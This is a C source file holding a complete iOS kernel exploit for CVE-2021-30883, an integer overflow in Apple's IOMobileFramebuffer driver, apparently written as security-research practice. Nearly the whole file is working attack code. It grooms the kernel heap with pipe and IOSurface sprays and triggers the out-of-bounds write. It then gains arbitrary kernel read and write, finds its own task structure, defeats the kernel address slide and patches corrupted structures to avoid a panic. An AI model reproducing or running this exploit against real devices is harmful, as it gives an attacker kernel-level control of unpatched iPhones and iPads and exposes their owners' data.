#include "exploit.h"
#include "ENABLE_HELPER.h"
#if ENABLE_HELPER
#include "helper/tfp0_krw.h"
#include "helper/offsets.h"
#include "helper/tfp0_find_port.h"
#include "helper/kutils.h"
#include "helper/kexecute.h"
#include "helper/kcall8.h"
#endif

#include "IOSurfaceRoot.h"
#include "krw.h"
#include "exploit_utilities.h"
#include "find_port.h"
#include "offsets.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdatomic.h>
#include <string.h>
#include <CoreFoundation/CoreFoundation.h>

extern void printLog(const char *format, ...);
#define printf(...) printLog(__VA_ARGS__)

extern uint32_t gIOSurface_ids[0x1000];
extern uint32_t gIOSurface_id_count;

uint32_t kernel_page_size = 0x4000;

void spinning(void) {
    puts("Spinning here...");
    while(1) {};
}

io_connect_t get_iomfb_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        printf("[-] failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD service: 0x%x\n", service);

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
    
    return shared_user_client_conn;
}

int increase_file_limit()
{
    int err = 0;
    struct rlimit rl = {};
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }

    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    err = setrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    return 0;
}

static void set_nonblock(int fd)
{
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int *create_pipes(int total_pipes) {
    size_t total_pipes_size = total_pipes * 2 * sizeof(int);
    int *pipefds = malloc(total_pipes_size);
    bzero(pipefds, total_pipes_size);

    for (size_t i = 0; i < total_pipes; i++)
    {
        pipefds[i * 2] = -1;
        pipefds[i * 2 + 1] = -1;
        
        int error = pipe(&pipefds[i * 2]);
        if (error != 0 ||
            pipefds[i * 2] < 0 ||
            pipefds[i * 2 + 1] < 0)
        {
            close(pipefds[i * 2]);
            close(pipefds[i * 2 + 1]);

            total_pipes = i;
            break;
        }

        set_nonblock(pipefds[i * 2]);
        set_nonblock(pipefds[i * 2 + 1]);
    }

    return pipefds;
}

int write_data_pipes(int *pipefds, int total_pipes, void* data, size_t data_sz) {
    void *pipebuf = malloc(kernel_page_size);
    bzero(pipebuf, kernel_page_size);

    memcpy(pipebuf, (void *)data, data_sz);
    for (int i = 0; i < total_pipes; i++)
    {
        int rfd = pipefds[2 * i];
        int wfd = pipefds[2 * i + 1];
        
        if(data_sz >= 0x3f10) {
            *(uint16_t *)(pipebuf + 0x3f04) = rfd;
            *(uint16_t *)(pipebuf + 0x3f06) = wfd;
        }

        size_t written = write(wfd, pipebuf, kernel_page_size - 1);
        
        if (written != kernel_page_size - 1)
        {
            total_pipes = i;
            printf("total_pipes is now: %d", total_pipes);
            break;
        }
    }

    free(pipebuf);

    return 0;
}

int close_pipes(int *pipefds, int total_pipes, bool has_except, int krw_rfd, int krw_wfd) {
    if (pipefds)
    {
        for (int i = 0; i < total_pipes; i++)
        {
            if(has_except) {
                if(pipefds[i] == krw_rfd || pipefds[i] == krw_wfd) {
                    continue;
                }
            }
            close(pipefds[i]);
        }
    }

    return 0;
}

int trigger_vuln(io_connect_t iomfb_uc) {

    //trigger oob write kext.kalloc.160
    //Thanks @AmarSaar for providing detail write-up and poc; https://github.com/saaramar/IOMFB_integer_overflow_poc
    kern_return_t ret = KERN_SUCCESS;
    size_t input_size = 0x180;
    
    uint64_t scalars[2] = { 0 };

    char *input = (char*)malloc(input_size);
    memset(input, 0x41, input_size);
    
    // control IOSurface ptr
    *(uint64_t *)(input + 0x150) = 0x8182838400000000 + ((KHEAP_DATA_MAPPABLE_LOC+0x10) & 0xffffffff);
    *(uint64_t *)(input + 0x158) = 0x1337133813391340;
    *(uint64_t *)(input + 0x154) = KHEAP_DATA_MAPPABLE_LOC+0x10;

    int *pArr = (int*)input;
    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x40000000;   // #iterations in the outer loop (new_from_data)
    pArr[3] = 2;
    pArr[8] = 2;
    pArr[89] = 40;        // #iterations in the inner loop (set_table)

    // do oob write to corrupt IOSurfaceClient
    ret = IOConnectCallMethod(iomfb_uc, 78,
                        scalars, 2,
                        input, input_size,
                        NULL, NULL,
                        NULL, NULL);
                    
    return 0;
}


int exploit(void) {
    offsets_init();
    
    printf("Exploiting CVE-2021-30883 (first journey from poc to exploit by @wh1te4ever!)\n");

    // pipe spray
    increase_file_limit();
    int total_pipes = 0x320;
    int *pipefds = create_pipes(total_pipes);

    void *pipe_data = malloc(kernel_page_size);
    memset(pipe_data, 0x42, kernel_page_size);

    *(uint64_t *)(pipe_data + 0x10 + 0xC0) = (KHEAP_DATA_MAPPABLE_LOC + 0x3f04) - 0x14; //will be read by IOSurface::get_use_count, will read data from kernel

    write_data_pipes(pipefds, total_pipes, pipe_data, kernel_page_size);

    // iosurface & iomfb
    mach_port_t iosurface_uc = IOSurfaceRoot_init();
    io_connect_t iomfb_uc = get_iomfb_uc();
    
    // spray IOSurface
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_uc);
        gIOSurface_ids[gIOSurface_id_count] = last_id;
        gIOSurface_id_count++;
        if ((0x3400) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }

    // punch hole kext.kalloc.160, free! (heap fengshui)
    // Thanks @jaakerblom for release Zer0con 2022 slide, that gives me idea!
    uint32_t last_free_surfid = 0;
    for (int32_t surf_idx = 0; surf_idx < gIOSurface_id_count; surf_idx++)
    {
        if(surf_idx >= 100 && surf_idx % 100 == 0) {
            IOSurfaceRoot_release_surface(iosurface_uc, gIOSurface_ids[surf_idx]);
            printf("release, iosurf_id = 0x%x\n", gIOSurface_ids[surf_idx]);
            last_free_surfid = gIOSurface_ids[surf_idx];
            gIOSurface_ids[surf_idx] = 0;
        }
    }

    trigger_vuln(iomfb_uc);

    // find out corrupted IOSurfaceClient's surf_id
    uint32_t krw_surf_id = 0;
    uint32_t krw_rfd = 0;
    uint32_t krw_wfd = 0;
    for (int i = 0; i < 50; i++)
    {
        uint32_t surf_id = last_free_surfid - i;
        uint32_t pipefd_leak = IOSurfaceRoot_get_surface_use_count(iosurface_uc, surf_id);
        if(pipefd_leak != 0) {
            krw_rfd = pipefd_leak & 0xffff;
            krw_wfd = (pipefd_leak >> 16) & 0xFFFF;
            printf("[+] Found corrupted IOSurfaceClient's surf_id = 0x%x\n", surf_id);
            printf("[+] pipefd_leak = 0x%x, krw_rfd = 0x%x, krw_wfd = 0x%x\n", pipefd_leak, krw_rfd, krw_wfd);

            krw_surf_id = surf_id;
            break;
        }
        
        surf_id = last_free_surfid + i;
        pipefd_leak = IOSurfaceRoot_get_surface_use_count(iosurface_uc, surf_id);
        if(pipefd_leak != 0) {
            krw_rfd = pipefd_leak & 0xffff;
            krw_wfd = (pipefd_leak >> 16) & 0xFFFF;
            printf("[+] Found corrupted IOSurfaceClient's surf_id = 0x%x\n", surf_id);
            printf("[+] pipefd_leak = 0x%x, krw_rfd = 0x%x, krw_wfd = 0x%x\n", pipefd_leak, krw_rfd, krw_wfd);

            krw_surf_id = surf_id;
            break;
        }
    }

    if(krw_surf_id == 0) {
        printf("Failed to find corrupted IOSurfaceClient's surf_id... :(\n");
        printf("Reboot to try again!\n");
        spinning();
    }

    //close all pipe except krw related
    close_pipes(pipefds, total_pipes, true, krw_rfd, krw_wfd);

    //check if krw works
    kernel_rw_init(iosurface_uc, krw_surf_id, krw_rfd, krw_wfd);

    // Is kread working?
    uint64_t kaddr = KHEAP_DATA_MAPPABLE_LOC + 0x2000;
    uint64_t val = kread64(kaddr);
    printf("kaddr: 0x%llx -> val: 0x%llx\n", kaddr, val);
    if(val != 0x4242424242424242) {
        printf("kernel read failed! :(\n");
        spinning();
    }

    // Is kwrite working?
    printf("Writing 0xcafebabe13371338 to kaddr(=0x%llx)\n", kaddr);
    kwrite64(kaddr, 0xcafebabe13371338);
    val = kread64(kaddr);
    printf("kaddr: 0x%llx -> val: 0x%llx\n", kaddr, val);
    if(val != 0xcafebabe13371338) {
        printf("kernel write failed! :(\n");
        spinning();
    }
    printf("Confirmed working kernel read/write!\n");


    #define port_cnt 0x2a00
    mach_port_t ports[port_cnt] = {};
    // setup ports
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
    }

    // spray kheap data ports
    int port_i = 0;
    #define POP_PORT() ports[port_i++]
    for(int i = 0; i < port_cnt; i++) {
        mach_port_t current_port = POP_PORT();
        mach_msg_size_t msg_size = message_size_for_kalloc_size(kernel_page_size) - sizeof(struct simple_msg);
        void *data = calloc(1, msg_size);
        memset(data, 0x43, msg_size);
        send_message(current_port, data, msg_size);
    }

    // find out where sprayed kmsg and obtain msgh_remote_port kaddr
    uint64_t guessed_ikm_header = KHEAP_DATA_MAPPABLE_LOC + 0x4000 * 512 + 0xfd0;
    uint64_t msgh_remote_port = 0;
    for(int i = 0; i < 100; i++) {
        // https://github.com/wh1te4ever/xnu_1day_practice/blob/main/CVE-2020-3837/helper/find_port.c#L31
        uint32_t off_mach_msg_header_t_msgh_remote_port = 0x8;    // (lldb) p/x offsetof(mach_msg_header_t, msgh_remote_port)
        uint64_t kmsgdata = guessed_ikm_header + 0x20;
        if(kread64(kmsgdata) == 0x4343434343434343) {
            msgh_remote_port = kread64(guessed_ikm_header + off_mach_msg_header_t_msgh_remote_port);
            printf("Found one of sprayed kmsg! ikm_header = 0x%llx, ikm_header->msgh_remote_port = 0x%llx\n", guessed_ikm_header, msgh_remote_port);
            break;
        }
        guessed_ikm_header += 0x4000;
    }
    if(msgh_remote_port == 0) {
        printf("Failed to find out sprayed kmsg...\n");
        spinning();
    }

    // Obtaining our task kaddr
    // msgh_remote_port's data.receiver    // 0x60 = p/x offsetof(ipc_port, data.receiver); data.receiver's type = ipc_space*
    uint64_t data_receiver = kread64(msgh_remote_port + 0x60);
    printf("data_receiver = 0x%llx\n", data_receiver);

    // data.receiver's is_task            // 0x30 = p/x offsetof(ipc_space, is_task); is_task's type = task*
    uint64_t our_task = kread64(data_receiver + 0x30);
    printf("our_task = 0x%llx\n", our_task);

    // clean our sprayed kheap data ports
    for (int i = 0; i < port_cnt; i++) {
        mach_port_destroy(mach_task_self(), ports[i]);
    }

    // Obtain kernel base via IOSurfaceRootUserClient_vtab
    uint64_t iosurface_port = find_port(our_task, iosurface_uc);
    uint64_t surfRoot = kread64(iosurface_port + off_ipc_port_ip_kobject);
    uint64_t IOSurfaceRootUserClient_vtab = kread64(surfRoot);
    IOSurfaceRootUserClient_vtab |= 0xffffff8000000000; // in case it has PAC
    uint64_t getExternalTrapForIndex_func = kread64(IOSurfaceRootUserClient_vtab + 8 * 0xb8);    //__ZN12IOUserClient24getTargetAndTrapForIndexEPP9IOServicej; LDR X8, [X8,#0x5C0]; 8*0xb8=0x5c0
    getExternalTrapForIndex_func |= 0xffffff8000000000;
    printf("getExternalTrapForIndex_func = 0x%llx\n", getExternalTrapForIndex_func);

    // walking down kpages to find kernel base
    uint64_t page = trunc_page_kernel(getExternalTrapForIndex_func);
    uint64_t kbase = 0;
    uint64_t kslide = 0;
    while (true) {
        if (kread64(page) == 0x0100000cfeedfacf && (kread64(page + 8) == 0x0000000200000000 || kread64(page + 8) == 0x0000000200000002)) {
            kbase = page;
            kslide = kbase - 0xfffffff007004000;
            break;
        }
        page -= kernel_page_size;
    }
    printf("Got kernel slide = 0x%llx, kernel base = 0x%llx\n", kslide, kbase);

    // Clean up!
    // Relink surfaceClient to prevent kernel panic
    uint64_t IOSurfaceRootUserClient_port = find_port(our_task, iosurface_uc);
    uint64_t IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
    uint64_t surfaceClients = kread64(IOSurfaceRootUserClient_addr + 0x118);
    printf("surfaceClients = 0x%llx\n", surfaceClients);

    uint64_t surfaceClient = kread64(surfaceClients + (krw_surf_id-20)*8);
    uint64_t surfaceClient2 = kread64(surfaceClients + (krw_surf_id+20)*8);

    // relink surfaceClient
    kwrite64(surfaceClient+0x20, surfaceClient2+0x18);    //overwrite next ptr;
    kwrite64(surfaceClient2+0x18, surfaceClient);        //overwrite prev ptr;

    //remove_surfaceclient_in_surfaceclients
    for(int k = (krw_surf_id-19); k < (krw_surf_id+20); k++) {
        if(k == krw_surf_id) continue;
        kwrite64(surfaceClients + k*8, 0);
    }

    //byebye krw
    kwrite64(surfaceClients + krw_surf_id*8, 0);
    close(krw_rfd);
    close(krw_wfd);

    IOSurfaceRoot_release_all(iosurface_uc);

    IOServiceClose(iosurface_uc);
    printf("done!\n");

    return 0;
}

